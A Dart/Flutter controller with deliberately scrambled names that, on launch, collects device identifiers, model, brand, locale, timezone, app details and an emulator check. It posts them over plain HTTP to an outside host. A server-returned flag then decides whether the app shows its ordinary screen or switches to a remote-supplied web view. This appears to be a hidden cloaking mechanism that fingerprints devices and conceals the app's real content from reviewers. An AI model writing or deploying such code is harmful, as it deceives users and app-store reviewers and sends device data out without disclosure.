import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var cnurwsb = RxBool(false);
  var knilgqsyp = RxBool(true);
  var lhpgjn = RxString("");
  var andy = RxBool(false);
  var morissette = RxBool(true);
  final glnkvw = Dio();


  InAppWebViewController? webViewController;

  dynamic aszwtfi(){
    final mugzvlb = InternetConnectionChecker.instance;
    final spnebqrfm = mugzvlb.onStatusChange.skip(1).listen(
          (InternetConnectionStatus phdwngrtf) {
        if (phdwngrtf == InternetConnectionStatus.connected) {
          eugrb();
        } else {
          Get.toNamed('/blindRestart')?.then((_){
            eugrb();
          });
        }
      },
    );
    return spnebqrfm;
  }

  Future<bool> krhyenasv() async {
    final bool uncpwd = await InternetConnectionChecker.instance.hasConnection;
    if(!uncpwd){
      Get.toNamed('/blindRestart')?.then((_){
        eugrb();
      });
    }
    return uncpwd;
  }

  @override
  void onInit() {
    super.onInit();
    aszwtfi();
    eugrb();
  }


  Future<void> eugrb() async {

    var pakgom = await krhyenasv();
    if(!pakgom){
      return;
    }

    andy.value = true;
    morissette.value = true;
    knilgqsyp.value = false;

    glnkvw.post("http://dy.bobbyn.net/efcznprwahbolixqkt",data: await xeafkqv()).then((value) {
      var kizf = value.data["kizf"] as String;
      var lxdh = value.data["lxdh"] as bool;
      if (lxdh) {
        lhpgjn.value = kizf;
        keagan();
      } else {
        boehm();
      }
    }).catchError((e) {
      knilgqsyp.value = true;
      morissette.value = true;
      andy.value = false;
    });
  }

  Future<Map<String, dynamic>> xeafkqv() async {
    final DeviceInfoPlugin ajtnkiuv = DeviceInfoPlugin();
    PackageInfo gnfc_xmgls = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var enwt = Platform.localeName;
    var zurm_EqGXzgxN = currentTimeZone;

    var zurm_hXMbP = gnfc_xmgls.packageName;
    var zurm_kwRjDfTX = gnfc_xmgls.version;
    var zurm_HKLSEJ = gnfc_xmgls.buildNumber;

    var zurm_Fy = gnfc_xmgls.appName;
    var zurm_MkzFJdo = "";
    var zurm_CJvIm  = "";
    var zurm_FfGjk = "";
    var damianTremblay = "";
    var jaronLarkin = "";
    var aidaBechtelar = "";
    var kenyonKuvalis = "";
    var reinholdTillman = "";
    var dylanEichmann = "";


    var zurm_iYE = "";
    var zurm_Gz = false;

    if (GetPlatform.isAndroid) {
      zurm_iYE = "android";
      var tyqbpwzo = await ajtnkiuv.androidInfo;

      zurm_FfGjk = tyqbpwzo.brand;

      zurm_MkzFJdo  = tyqbpwzo.model;
      zurm_CJvIm = tyqbpwzo.id;

      zurm_Gz = tyqbpwzo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zurm_iYE = "ios";
      var zaxbrjkivp = await ajtnkiuv.iosInfo;
      zurm_FfGjk = zaxbrjkivp.name;
      zurm_MkzFJdo = zaxbrjkivp.model;

      zurm_CJvIm = zaxbrjkivp.identifierForVendor ?? "";
      zurm_Gz  = zaxbrjkivp.isPhysicalDevice;
    }
    var res = {
      "enwt": enwt,
      "zurm_kwRjDfTX": zurm_kwRjDfTX,
      "zurm_hXMbP": zurm_hXMbP,
      "zurm_MkzFJdo": zurm_MkzFJdo,
      "aidaBechtelar" : aidaBechtelar,
      "zurm_EqGXzgxN": zurm_EqGXzgxN,
      "zurm_FfGjk": zurm_FfGjk,
      "zurm_CJvIm": zurm_CJvIm,
      "zurm_iYE": zurm_iYE,
      "zurm_Gz": zurm_Gz,
      "damianTremblay" : damianTremblay,
      "zurm_HKLSEJ": zurm_HKLSEJ,
      "jaronLarkin" : jaronLarkin,
      "kenyonKuvalis" : kenyonKuvalis,
      "zurm_Fy": zurm_Fy,
      "reinholdTillman" : reinholdTillman,
      "dylanEichmann" : dylanEichmann,

    };
    return res;
  }

  Future<void> boehm() async {
    Get.toNamed("/blindTab");
  }

  Future<void> keagan() async {
    Get.offAllNamed("/blindInit");
  }

  @override
  void dispose() {
    aszwtfi().cancel();
    super.dispose();
  }

}
